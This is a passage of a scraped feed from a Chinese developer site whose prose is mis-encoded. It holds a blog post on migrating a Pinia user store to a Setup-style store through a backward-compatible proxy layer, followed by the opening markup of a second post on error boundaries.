solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>é‡æ„é—ç•™ä»£ç æœ€æ€•ä»€ä¹ˆï¼Ÿæ”¹ä¸€å¤„å´©åå¤„ã€‚è¿™ç¯‡æ–‡ç« åˆ†äº«ä¸€ä¸ªæˆ‘åœ¨å®é™…é¡¹ç›®ä¸­ç”¨è¿‡çš„æ–¹æ¡ˆï¼šç”¨ä»£ç†æ¨¡å¼å®ç° Pinia Store çš„å¹³æ»‘è¿ç§»ï¼Œè®©å‡ åå¤„æ—§ä»£ç æ— æ„Ÿå‡çº§ã€‚</p>
</blockquote>
<h2 data-id="heading-0">èƒŒæ™¯ï¼šä¸ºä»€ä¹ˆè¦è¿ç§»</h2>
<p>é¡¹ç›®é‡Œæœ‰ä¸ª <code>useUserStore</code>ï¼Œæœ€æ—©æ˜¯ç”¨ Options API å†™çš„ï¼Œéšç€ä¸šåŠ¡è¿­ä»£ï¼Œé—®é¢˜è¶Šæ¥è¶Šå¤šï¼š</p>
<ul>
<li>ç±»å‹å®šä¹‰ä¸å®Œæ•´ï¼Œåˆ°å¤„æ˜¯ <code>any</code></li>
<li>å‘½åä¸è§„èŒƒï¼Œ<code>setUserInfoAction</code>ã€<code>loginOut</code> è¿™ç§å‘½åçœ‹ç€éš¾å—</li>
<li>çŠ¶æ€ç»“æ„å’Œåç«¯è¿”å›ä¸ä¸€è‡´ï¼Œå‰ç«¯åŠ äº†å¾ˆå¤š hack</li>
<li>æ²¡æœ‰æŒ‰ä¸šåŠ¡åŸŸç»„ç»‡ï¼Œæ‰€æœ‰ Store éƒ½å †åœ¨æ ¹ç›®å½•</li>
</ul>
<p>æƒ³é‡æ„æˆ Setup é£æ ¼ï¼Œé¡ºä¾¿ç†æ¸…ç±»å‹å’Œå‘½åã€‚ä½†é—®é¢˜æ¥äº†ï¼š<strong>è¿™ä¸ª Store è¢«å‡ åä¸ªæ–‡ä»¶å¼•ç”¨ï¼Œç›´æ¥æ”¹å¯¼å…¥è·¯å¾„ï¼Ÿé£é™©å¤ªå¤§ã€‚</strong></p>
<h2 data-id="heading-1">æ–¹æ¡ˆï¼šä»£ç†æ¨¡å¼ + æ¸è¿›å¼è¿ç§»</h2>
<p>æ ¸å¿ƒæ€è·¯å¾ˆç®€å•ï¼š<strong>ä¸åŠ¨æ—§è·¯å¾„ï¼Œè®©æ—§æ–‡ä»¶å˜æˆä»£ç†</strong>ã€‚</p>
<pre><code class="hljs language-bash" lang="bash">æ—§å¯¼å…¥è·¯å¾„                        æ–° Store
src/store/user.ts  â”€â”€â”€ä»£ç†â”€â”€â”€â–º  src/store/core/user.ts
       â–²                               â”‚
       â”‚                               â”‚
   å‡ åå¤„ä¸šåŠ¡ä»£ç                      å”¯ä¸€æ•°æ®æº
</code></pre>
<p>è¿™æ ·åšçš„å¥½å¤„ï¼š</p>
<ul>
<li>âœ… æ—§ä»£ç ä¸€è¡Œä¸æ”¹ï¼Œç»§ç»­ç”¨ <code>~/store/user</code> å¯¼å…¥</li>
<li>âœ… æ–°ä»£ç ç›´æ¥ç”¨ <code>~/store/core</code> å¯¼å…¥</li>
<li>âœ… æ•°æ®æºå”¯ä¸€ï¼Œä¸ä¼šå‡ºç°çŠ¶æ€ä¸åŒæ­¥</li>
<li>âœ… å¯ä»¥æ…¢æ…¢æŠŠæ—§ä»£ç è¿ç§»åˆ°æ–°è·¯å¾„</li>
</ul>
<hr/>
<h2 data-id="heading-2">å®ç°æ­¥éª¤</h2>
<h3 data-id="heading-3">Step 1ï¼šå…ˆå†™æ–°çš„ Store</h3>
<p>åœ¨ <code>src/store/core/user.ts</code> åˆ›å»ºæ–°çš„ Setup é£æ ¼ Storeï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/store/core/user.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useUserStore = <span class="hljs-title function_">defineStore</span>(<span class="hljs-string">'user'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// ==================== State ====================</span>
  <span class="hljs-keyword">const</span> userInfo = ref&lt;<span class="hljs-title class_">UserInfo</span>&gt;(<span class="hljs-title function_">getDefaultUserInfo</span>())
  <span class="hljs-keyword">const</span> permissions = ref&lt;<span class="hljs-title class_">Permission</span>[]&gt;([])
  <span class="hljs-keyword">const</span> locale = ref&lt;<span class="hljs-title class_">SupportedLanguage</span>&gt;(<span class="hljs-string">'zh'</span>)
  <span class="hljs-keyword">const</span> isRouterInitialized = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">false</span>)

  <span class="hljs-comment">// ==================== Getters ====================</span>
  <span class="hljs-keyword">const</span> isLoggedIn = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> !!userInfo.<span class="hljs-property">value</span>.<span class="hljs-property">id</span>)
  <span class="hljs-keyword">const</span> nickname = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> userInfo.<span class="hljs-property">value</span>.<span class="hljs-property">realName</span> || <span class="hljs-string">''</span>)

  <span class="hljs-comment">// ==================== Actions ====================</span>
  <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">loadUserInfo</span>(<span class="hljs-params"/>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; {
    <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> userApi.<span class="hljs-title function_">getPermissionsInfo</span>()
    <span class="hljs-keyword">if</span> (res.<span class="hljs-property">data</span>) {
      userInfo.<span class="hljs-property">value</span> = { ...<span class="hljs-title function_">getDefaultUserInfo</span>(), ...res.<span class="hljs-property">data</span>.<span class="hljs-property">user</span> }
      permissions.<span class="hljs-property">value</span> = res.<span class="hljs-property">data</span>.<span class="hljs-property">permissions</span> || []
    }
  }

  <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">logout</span>(<span class="hljs-params"/>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; {
    userInfo.<span class="hljs-property">value</span> = <span class="hljs-title function_">getDefaultUserInfo</span>()
    permissions.<span class="hljs-property">value</span> = []
    <span class="hljs-comment">// ... æ¸…ç†é€»è¾‘</span>
  }

  <span class="hljs-keyword">return</span> {
    userInfo, permissions, locale, isRouterInitialized,
    isLoggedIn, nickname,
    loadUserInfo, logout,
  }
})
</code></pre>
<p>ç±»å‹æ¸…æ™°ï¼Œå‘½åè§„èŒƒï¼Œèˆ’æœã€‚</p>
<h3 data-id="heading-4">Step 2ï¼šæŠŠæ—§æ–‡ä»¶æ”¹æˆä»£ç†</h3>
<p>é‡ç‚¹æ¥äº†ã€‚æŠŠåŸæ¥çš„ <code>src/store/user.ts</code> æ”¹æˆä»£ç†å±‚ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/store/user.ts - å˜æˆä»£ç†å±‚</span>
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">Pinia</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'pinia'</span>
<span class="hljs-keyword">import</span> { storeToRefs } <span class="hljs-keyword">from</span> <span class="hljs-string">'pinia'</span>
<span class="hljs-keyword">import</span> { computed } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { useUserStore <span class="hljs-keyword">as</span> useCoreUserStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'./core/user'</span>

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@deprecated</span> å»ºè®®è¿ç§»åˆ° useUserStore from '~/store/core'
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useUserStore</span>(<span class="hljs-params">_pinia?: Pinia</span>) {
  <span class="hljs-comment">// è½¬å‘åˆ°æ–° Store</span>
  <span class="hljs-keyword">const</span> coreStore = <span class="hljs-title function_">useCoreUserStore</span>()

  <span class="hljs-keyword">const</span> { userInfo, permissions, locale, isRouterInitialized } = <span class="hljs-title function_">storeToRefs</span>(coreStore)

  <span class="hljs-comment">// å…¼å®¹æ—§çš„ getter å‘½å</span>
  <span class="hljs-keyword">const</span> getLocale = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> locale.<span class="hljs-property">value</span>)
  <span class="hljs-keyword">const</span> getPermissions = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> permissions.<span class="hljs-property">value</span>)

  <span class="hljs-comment">// å…¼å®¹æ—§çš„ action å‘½å</span>
  <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">setUserInfoAction</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">await</span> coreStore.<span class="hljs-title function_">loadUserInfo</span>()  <span class="hljs-comment">// è½¬å‘</span>
  }

  <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">loginOut</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">await</span> coreStore.<span class="hljs-title function_">logout</span>()  <span class="hljs-comment">// è½¬å‘</span>
  }

  <span class="hljs-comment">// å…¼å®¹ userStore.user.xxx çš„ç›´æ¥è®¿é—®æ–¹å¼</span>
  <span class="hljs-keyword">const</span> userProxy = {
    <span class="hljs-keyword">get</span> <span class="hljs-title function_">user</span>() { <span class="hljs-keyword">return</span> userInfo.<span class="hljs-property">value</span> }
  }

  <span class="hljs-keyword">return</span> {
    userInfo, permissions, locale,
    ...userProxy,  <span class="hljs-comment">// æ”¯æŒ store.user.readAll è¿™ç§è®¿é—®</span>
    <span class="hljs-comment">// æ—§å‘½åï¼ˆå…¼å®¹ï¼‰</span>
    getLocale, getPermissions,
    setUserInfoAction, loginOut,
    <span class="hljs-comment">// æ–°å‘½åï¼ˆæ¨èï¼‰</span>
    <span class="hljs-attr">loadUserInfo</span>: coreStore.<span class="hljs-property">loadUserInfo</span>,
    <span class="hljs-attr">logout</span>: coreStore.<span class="hljs-property">logout</span>,
  }
}
</code></pre>
<p>å‡ ä¸ªå…³é”®ç‚¹ï¼š</p>
<h4 data-id="heading-5">1. æ¥å—å¯é€‰çš„ pinia å‚æ•°</h4>
<p>æ—§ä»£ç å¯èƒ½å†™æˆ <code>useUserStore(store)</code>ï¼Œæ–°çš„ä»£ç†å±‚è¦å…¼å®¹è¿™ç§å†™æ³•ï¼Œè™½ç„¶å‚æ•°å®é™…ä¸ç”¨ã€‚</p>
<h4 data-id="heading-6">2. ç”¨ getter ä»£ç† user å±æ€§</h4>
<p>æ—§ä»£ç ç›´æ¥ <code>userStore.user.readAll</code> è®¿é—®ï¼Œä¸æ˜¯ <code>userStore.user.value.readAll</code>ã€‚ç”¨ getter å¯ä»¥å®ç°è¿™ç§"ç›´æ¥è®¿é—®"çš„æ•ˆæœï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> userProxy = {
  <span class="hljs-keyword">get</span> <span class="hljs-title function_">user</span>() { <span class="hljs-keyword">return</span> userInfo.<span class="hljs-property">value</span> }
}
<span class="hljs-keyword">return</span> { ...userProxy }
</code></pre>
<h4 data-id="heading-7">3. æ–°æ—§å‘½åéƒ½æš´éœ²</h4>
<p>è®©ä¸šåŠ¡ä»£ç å¯ä»¥æ¸è¿›å¼è¿ç§»ï¼Œ<code>setUserInfoAction</code> å’Œ <code>loadUserInfo</code> åŒæ—¶å¯ç”¨ã€‚</p>
<h3 data-id="heading-8">Step 3ï¼šåŠ ä¸Š @deprecated æ ‡è®°</h3>
<p>ç»™ä»£ç†å±‚åŠ ä¸Š JSDoc çš„ <code>@deprecated</code> æ ‡è®°ï¼ŒIDE ä¼šç»™å‡ºæç¤ºï¼Œæ–¹ä¾¿åç»­æ¸…ç†ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">/** <span class="hljs-doctag">@deprecated</span> ä½¿ç”¨ coreStore.loadUserInfo ä»£æ›¿ */</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">setUserInfoAction</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">await</span> coreStore.<span class="hljs-title function_">loadUserInfo</span>()
}
</code></pre>
<hr/>
<h2 data-id="heading-9">æµ‹è¯•éªŒè¯</h2>
<p>è¿ç§»æœ€æ€•çš„æ˜¯"çœ‹èµ·æ¥æ²¡é—®é¢˜ï¼Œä¸Šçº¿æ‰å‡ºäº‹"ã€‚è¿™é‡Œç»™ä¸€å¥—éªŒè¯æ–¹æ¡ˆã€‚</p>
<h3 data-id="heading-10">å¿«é€Ÿå†’çƒŸæµ‹è¯•</h3>
<p>åœ¨æµè§ˆå™¨æ§åˆ¶å°è·‘ä¸€ä¸‹ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ—§è·¯å¾„</span>
<span class="hljs-keyword">import</span> { useUserStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'~/store/user'</span>
<span class="hljs-comment">// æ–°è·¯å¾„</span>
<span class="hljs-keyword">import</span> { useUserStore <span class="hljs-keyword">as</span> useCoreUserStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'~/store/core'</span>

<span class="hljs-keyword">const</span> oldStore = <span class="hljs-title function_">useUserStore</span>()
<span class="hljs-keyword">const</span> newStore = <span class="hljs-title function_">useCoreUserStore</span>()

<span class="hljs-comment">// éªŒè¯æ•°æ®æºå”¯ä¸€</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å¼•ç”¨ç›¸åŒ:'</span>, oldStore.<span class="hljs-property">userInfo</span> === newStore.<span class="hljs-property">userInfo</span>)  <span class="hljs-comment">// true</span>

<span class="hljs-comment">// éªŒè¯çŠ¶æ€åŒæ­¥</span>
newStore.<span class="hljs-title function_">setLocale</span>(<span class="hljs-string">'en'</span>)
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'çŠ¶æ€åŒæ­¥:'</span>, oldStore.<span class="hljs-property">locale</span>.<span class="hljs-property">value</span> === <span class="hljs-string">'en'</span>)  <span class="hljs-comment">// true</span>
</code></pre>
<h3 data-id="heading-11">å…³é”®è·¯å¾„éªŒè¯</h3>



































<table><thead><tr><th>åœºæ™¯</th><th>æ“ä½œ</th><th>é¢„æœŸ</th></tr></thead><tbody><tr><td>ç™»å½•</td><td>æ­£å¸¸ç™»å½•</td><td>ç”¨æˆ·åæ­£ç¡®æ˜¾ç¤º</td></tr><tr><td>æƒé™</td><td>è®¿é—®å—é™é¡µé¢</td><td>æƒé™åˆ¤æ–­æ­£å¸¸</td></tr><tr><td>è¯­è¨€</td><td>åˆ‡æ¢ä¸­è‹±æ–‡</td><td>å…¨å±€åˆ‡æ¢ï¼Œåˆ·æ–°åä¿æŒ</td></tr><tr><td>ç™»å‡º</td><td>ç‚¹å‡»ç™»å‡º</td><td>çŠ¶æ€æ¸…é™¤ï¼Œè·³è½¬ç™»å½•é¡µ</td></tr><tr><td>åˆ·æ–°</td><td>F5 åˆ·æ–°é¡µé¢</td><td>çŠ¶æ€æ­£ç¡®æ¢å¤</td></tr></tbody></table>
<h3 data-id="heading-12">å•å…ƒæµ‹è¯•</h3>
<p>å†™ä¸€ä¸ªå…¼å®¹æ€§æµ‹è¯•ï¼Œç¡®ä¿æ–°æ—§ API è¡Œä¸ºä¸€è‡´ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-title function_">describe</span>(<span class="hljs-string">'User Store å…¼å®¹æ€§'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">it</span>(<span class="hljs-string">'æ–°æ—§ Store åº”æŒ‡å‘åŒä¸€æ•°æ®æº'</span>, <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> oldStore = <span class="hljs-title function_">useUserStore</span>()
    <span class="hljs-keyword">const</span> coreStore = <span class="hljs-title function_">useCoreUserStore</span>()
    <span class="hljs-title function_">expect</span>(oldStore.<span class="hljs-property">userInfo</span>).<span class="hljs-title function_">toBe</span>(coreStore.<span class="hljs-property">userInfo</span>)
  })

  <span class="hljs-title function_">it</span>(<span class="hljs-string">'setUserInfoAction åº”ç­‰ä»·äº loadUserInfo'</span>, <span class="hljs-keyword">async</span> () =&gt; {
    <span class="hljs-keyword">const</span> store = <span class="hljs-title function_">useUserStore</span>()
    <span class="hljs-keyword">await</span> store.<span class="hljs-title function_">setUserInfoAction</span>()
    <span class="hljs-title function_">expect</span>(store.<span class="hljs-property">userInfo</span>.<span class="hljs-property">value</span>.<span class="hljs-property">id</span>).<span class="hljs-title function_">toBeTruthy</span>()
  })
})
</code></pre>
<hr/>
<h2 data-id="heading-13">æ¸è¿›å¼è¿ç§»</h2>
<p>ä»£ç†å±‚æå®šåï¼Œä¸šåŠ¡ä»£ç å¯ä»¥æ…¢æ…¢è¿ç§»ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ============ æ—§å†™æ³•ï¼ˆç»§ç»­å¯ç”¨ï¼‰ ============</span>
<span class="hljs-keyword">import</span> { useUserStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'~/store/user'</span>

<span class="hljs-keyword">const</span> store = <span class="hljs-title function_">useUserStore</span>(pinia)
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(store.<span class="hljs-property">user</span>.<span class="hljs-property">readAll</span>)
<span class="hljs-keyword">await</span> store.<span class="hljs-title function_">setUserInfoAction</span>()

<span class="hljs-comment">// ============ æ–°å†™æ³•ï¼ˆæ¨èï¼‰ ============</span>
<span class="hljs-keyword">import</span> { useUserStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'~/store/core'</span>

<span class="hljs-keyword">const</span> store = <span class="hljs-title function_">useUserStore</span>()
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(store.<span class="hljs-property">userInfo</span>.<span class="hljs-property">readAll</span>)
<span class="hljs-keyword">await</span> store.<span class="hljs-title function_">loadUserInfo</span>()
</code></pre>
<p>æ²¡æœ‰ deadline å‹åŠ›çš„è¯ï¼Œå¯ä»¥æ¯æ¬¡æ”¹ä¸šåŠ¡åŠŸèƒ½çš„æ—¶å€™é¡ºæ‰‹æŠŠå¯¼å…¥è·¯å¾„æ”¹æ‰ï¼Œå‡ ä¸ªæœˆåæ—§è·¯å¾„çš„å¼•ç”¨è‡ªç„¶å°±æ¸…é›¶äº†ã€‚</p>
<hr/>
<h2 data-id="heading-14">å…¼å®¹ç‚¹é€ŸæŸ¥è¡¨</h2>

































<table><thead><tr><th>æ—§ç”¨æ³•</th><th>å…¼å®¹æ–¹å¼</th></tr></thead><tbody><tr><td><code>useUserStore(store)</code></td><td>æ¥å—å¯é€‰å‚æ•° <code>_pinia?: Pinia</code></td></tr><tr><td><code>userStore.user.readAll</code></td><td>ä½¿ç”¨ getter ä»£ç†ç›´æ¥è®¿é—®</td></tr><tr><td><code>userStore.setUserInfoAction()</code></td><td>è½¬å‘åˆ° <code>loadUserInfo()</code></td></tr><tr><td><code>userStore.loginOut()</code></td><td>è½¬å‘åˆ° <code>logout()</code></td></tr><tr><td><code>userStore.isSetRouters</code></td><td>åˆ«ååˆ° <code>isRouterInitialized</code></td></tr><tr><td><code>userStore.getLocale</code></td><td>computed åŒ…è£… <code>locale.value</code></td></tr></tbody></table>
<hr/>
<h2 data-id="heading-15">æ€»ç»“</h2>
<p>è¿™å¥—æ–¹æ¡ˆçš„æ ¸å¿ƒå°±ä¸‰ç‚¹ï¼š</p>
<ol>
<li><strong>æ•°æ®æºå”¯ä¸€</strong>ï¼šæ–°æ—§è·¯å¾„æœ€ç»ˆéƒ½æŒ‡å‘åŒä¸€ä¸ª Store å®ä¾‹</li>
<li><strong>API å…¼å®¹</strong>ï¼šä»£ç†å±‚è½¬å‘æ‰€æœ‰æ—§çš„æ–¹æ³•è°ƒç”¨</li>
<li><strong>æ¸è¿›è¿ç§»</strong>ï¼šæ–°æ—§å†™æ³•å¹¶å­˜ï¼Œæ²¡æœ‰ç¡¬æ€§åˆ‡æ¢æ—¶é—´ç‚¹</li>
</ol>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>Store è¢«å¤§é‡æ–‡ä»¶å¼•ç”¨ï¼Œä¸æ•¢ç›´æ¥æ”¹è·¯å¾„</li>
<li>æƒ³é‡æ„ä½†åˆæ€•å‡ºé—®é¢˜</li>
<li>å›¢é˜Ÿä¹ æƒ¯æ¸è¿›å¼æ”¹è¿›ï¼Œä¸å–œæ¬¢å¤§çˆ†ç‚¸å¼é‡æ„</li>
</ul>
<p><strong>ä¸é€‚ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>Store åªæœ‰å‡ å¤„å¼•ç”¨ï¼Œç›´æ¥å…¨å±€æ›¿æ¢æ›´å¿«</li>
<li>é‡æ„æ¶‰åŠ Store ID å˜æ›´ï¼ˆä¼šå½±å“æŒä¹…åŒ–ï¼‰</li>
</ul>
<hr/>
<p>å¸Œæœ›è¿™ä¸ªæ–¹æ¡ˆå¯¹ä½ æœ‰å¸®åŠ©ã€‚æœ‰é—®é¢˜æ¬¢è¿è®¨è®º ğŸ‘‹</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¼˜é›…åœ°å¤„ç†å‰ç«¯é”™è¯¯è¾¹ç•Œ]]></title>    <link>https://juejin.cn/post/7580740782933590058</link>    <guid>https://juejin.cn/post/7580740782933590058</guid>    <pubDate>2025-12-08T05:59:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580740782933590058" data-draft-id="7580753790771953706" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¼˜é›…åœ°å¤„ç†å‰ç«¯é”™è¯¯è¾¹ç•Œ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-08T05:59:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="dorisrv"/> <meta itemprop="url" content="https://juejin.cn/user/1522178380270712"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¼˜é›…åœ°å¤„ç†å‰ç«¯é”™è¯¯è¾¹ç•Œ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1522178380270712/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    dorisrv
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T05:59:31.000Z" title="Mon Dec 08 2025 05:59:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    35
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body 